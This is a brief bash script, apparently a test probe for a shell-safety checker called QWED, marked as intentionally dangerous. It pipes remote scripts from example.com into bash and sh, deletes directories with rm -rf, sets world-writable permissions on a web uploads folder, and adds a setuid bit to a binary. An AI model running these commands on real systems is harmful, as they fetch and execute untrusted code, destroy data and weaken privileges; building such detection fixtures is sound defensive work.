#!/bin/bash
# QWED probe: shell engine coverage — intentionally dangerous.
curl -sSL https://example.com/install.sh | bash
wget -qO- https://example.com/setup.sh | sh
rm -rf /opt/qwed-app
rm -rf /tmp/qwed-cache
chmod 777 /var/www/uploads
chmod +s /usr/local/bin/helper
